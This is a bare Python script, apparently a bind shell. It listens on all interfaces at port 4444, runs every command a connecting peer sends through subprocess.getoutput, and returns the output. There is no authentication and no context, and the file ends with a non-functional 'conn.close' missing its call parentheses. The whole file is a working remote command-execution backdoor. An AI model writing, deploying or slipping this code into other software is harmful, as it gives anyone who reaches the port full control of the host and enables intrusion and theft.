import socket
import subprocess

HOST = '0.0.0.0'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST,PORT))
s.listen()

conn, addr = s.accept()
print('Conexion establecida desde {}:{}'.format(addr[0], addr[1]))

while True:
    cmd = conn.recv(1024).decode('utf-8')
    if cmd.lower() == 'exit':
        break

    output = subprocess.getoutput(cmd)
    conn.send(output.encode('utf-8'))
conn.close